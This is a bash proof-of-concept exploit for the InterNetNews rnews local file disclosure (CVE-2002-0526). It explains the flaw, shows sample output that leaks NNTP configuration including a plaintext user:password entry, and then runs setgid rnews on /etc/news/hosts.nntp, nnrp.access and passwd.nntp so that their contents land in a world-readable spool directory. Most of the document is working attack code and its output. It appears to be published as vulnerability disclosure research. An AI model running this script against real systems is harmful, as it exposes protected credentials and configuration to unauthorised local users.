#!/bin/bash
# InterNetNews (inn) rnews local file disclosure (CVE-2002-0526)
# ---
# In 2002, Paul "IhaQueR" Starzetz reported several issues with
# `inews` and `rnews` utilities packaged with InterNetNews (inn):
#
# * http://web.archive.org/web/20020602000140/
#     http://archives.neohapsis.com/archives/bugtraq/2002-04/0140.html
#
# hinting:
#   "[...] in the case of rnews, access to probably sensitive inn
#   configuration files seems possible"
#
# No proof of concept was provided, and although the issue was resolved
# in inn2 packages (by removing world execute permission from `rnews`),
# it was never patched in inn.
#
# As of 2020-11-23, various Linux distributions continue to offer packages
# for both inn and inn2. Additionally, some packages rely on the inn package
# (rather than inn2):
#
# # apt-get install ifgate
# Reading package lists... Done
# Building dependency tree
# Reading state information... Done
# The following additional packages will be installed:
#   bsd-mailx ifmail inn
# Suggested packages:
#   ifcico
# ...
#
# Debian 10, Ubuntu 20.04, Linux Mint 19 (and probably others) continue
# to ship inn in a vulnerable configuration. Although `rnews` is now
# shipped with the set-gid bit, rather than set-uid, it still has world
# execution permissions, and still allows local users to gain access
# to inn configuration files.
#
# By default, read access to sensitive configuration files is restricted
# to only `news` group and `root` user:
# 
# $ ls -la /etc/news/hosts.nntp
# -rw-r----- 1 root news 557 Oct 18  2019 /etc/news/hosts.nntp
# $ ls -la /etc/news/nnrp.access
# -rw-r----- 1 root news 823 Oct 18  2019 /etc/news/nnrp.access
# $ ls -la /etc/news/passwd.nntp
# -rw-r----- 1 root news 597 Oct 18  2019 /etc/news/passwd.nntp
#
# By default, `/usr/bin/rnews` is set-gid `news`:
#
# $ ls -la /usr/bin/rnews 
# -rwxr-sr-x 1 root news 35160 Oct 18  2019 /usr/bin/rnews
#
# rnews does not drop privileges when reading user-supplied file paths,
# allowing any file to be read with `news` group permissions and parsed
# as an incoming article. This allows partial access to the first few
# bytes of configuration file contents.
#
# $ /usr/bin/rnews -v /etc/news/nnrp.access
# /etc/news/nnrp.access: bad_article missing Message-ID [##  $Revision: 1.7 $
# ##  nnrp.access - a...]
#
# However, it is also possible to retrieve the entire file contents.
#
# From the `rnews` man page:
#
#   "If rnews detects any problems with an article such as a missing header,
#   or an unintelligible reply from the server, it will save a copy of the
#   article in the /var/spool/news/in.coming/bad directory."
#
# By default, the `/var/spool/news/*` directories are world readable.
#
# $ ls -la /var/spool/news/
# total 24
# drwxr-xr-x 6 news news 4096 Nov 23 00:03 .
# drwxr-xr-x 8 root root 4096 Nov 23 00:03 ..
# drwxrwxr-x 4 news news 4096 Nov 23 00:03 in.coming
# drwxrwxr-x 2 news news 4096 Nov 23 00:03 news.archive
# drwxrwxr-x 2 news news 4096 Nov 23 00:03 out.going
# drwxrwxr-x 2 news news 4096 Nov 23 00:03 over.view
#
# As the configuration files are not appropriately formatted articles,
# attempting to load these files with `rnews` will cause the file contents
# to be written to `/var/spool/news/in.coming/bad`, revealing the contents
# to all local users.
# ---
# test@ubuntu-20-04-x64:~$ ./inn-rnews-config-disclosure 
# InterNetNews (inn) rnews file disclosure (CVE-2002-0526)
# Checking /usr/bin/rnews ...
# + /usr/bin/rnews is executable
# + /usr/bin/rnews has set-uid or set-gid set
# Checking /var/spool/news/in.coming/bad/ ...
# + /var/spool/news/in.coming/bad/ directory exists
# + /var/spool/news/in.coming/bad/ contents are readable
# Reading config files with /usr/bin/rnews ...
# /etc/news/hosts.nntp: bad_article missing Message-ID [##  $Revision: 1.7 $
# ##  hosts.nntp - na...]
# /etc/news/nnrp.access: bad_article missing Message-ID [##  $Revision: 1.7 $
# ##  nnrp.access - a...]
# /etc/news/passwd.nntp: bad_article missing Message-ID [##  $Revision: 1.4 $
# ##  passwd.nntp - p...]
# + Done
# Checking for new articles in /var/spool/news/in.coming/bad/ ...
# + Found 3 new files
# +-rw-rw-r-- 1 test news   918 Nov 23 17:05 5fbb51442Xo62O
# +-rw-rw-r-- 1 test news   611 Nov 23 17:05 5fbb51449cnhDO
# +-rw-rw-r-- 1 test news   651 Nov 23 17:05 5fbb5144Cdcl6Q
# test@ubuntu-20-04-x64:~$ tail /var/spool/news/in.coming/bad/5fbb51442Xo62O
# ##
# ## Default is no access, no way to authentication, and no groups.
# *:: -no- : -no- :!*
# ##  Foo, Incorporated, hosts have no password, can read anything.
# #*.foo.com:Read Post:::*
#
# stdin:Read Post:::*
# localhost:Read Post:::*
# 127.0.0.1:Read Post:::*
# 172.16.191.165:Read Post:user:password:*
# ---
# <bcoles@gmail.com>
# https://github.com/bcoles/local-exploits/tree/master/CVE-2002-0526

RNEWS_PATH="/usr/bin/rnews"

echo "InterNetNews (inn) rnews file disclosure (CVE-2002-0526)"

echo "Checking ${RNEWS_PATH} ..."

if ! test -x "${RNEWS_PATH}"; then
  echo "fatal: ${RNEWS_PATH} is not executable"
  exit 1
fi

echo "+ ${RNEWS_PATH} is executable"

if ! test -u "${RNEWS_PATH}" && ! test -g "${RNEWS_PATH}"; then
  echo "fatal: ${RNEWS_PATH} does not have set-uid or set-gid bit set"
  exit 1
fi

echo "+ ${RNEWS_PATH} has set-uid or set-gid set"

# strings "${RNEWS_PATH}" | grep bad
incoming_bad="/var/spool/news/in.coming/bad/"

echo "Checking ${incoming_bad} ..."

if ! test -d "${incoming_bad}"; then
  echo "fatal: ${incoming_bad} is not a directory"
  exit 1
fi

echo "+ ${incoming_bad} directory exists"

before="$(ls -la "${incoming_bad}")"
if test -z "${before}"; then
  echo "fatal: ${incoming_bad} contents are not readable"
  exit 1
fi

echo "+ ${incoming_bad} contents are readable"

echo "Reading config files with ${RNEWS_PATH} ..."

$RNEWS_PATH -v -N /etc/news/hosts.nntp
$RNEWS_PATH -v -N /etc/news/nnrp.access
$RNEWS_PATH -v -N /etc/news/passwd.nntp

after="$(ls -la "${incoming_bad}")"
echo "+ Done"

echo "Checking for new articles in ${incoming_bad} ..."

diff="$(($(echo "$after" | wc -l) - $(echo "$before" | wc -l)))"
if [ "${diff}" -eq "0" ]; then
  echo "fatal: found no new files"
  exit 1
fi

echo "+ Found ${diff} new files"
diff -u <(echo "${before}" ) <(echo "${after}") | tail -n$diff

